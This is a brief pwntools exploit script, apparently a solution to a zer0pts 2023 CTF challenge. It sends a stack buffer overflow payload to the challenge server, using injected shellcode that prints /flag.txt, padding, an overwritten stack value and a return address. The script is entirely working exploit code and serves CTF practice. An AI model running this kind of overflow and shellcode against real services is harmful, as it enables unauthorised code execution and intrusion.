from pwn import *

context.arch = "amd64"
r = remote("pwn.2023.zer0pts.com", 9005)
r.recvuntil("Enter something")
shellcode = asm(shellcraft.cat("/flag.txt", 1))
r.sendline(
    flat(
        shellcode,
        "A" * (0x108 - len(shellcode)),
        0x6161616161616100,
        "A" * 8,
        0x80000000DC40,
    )
)
r.interactive()
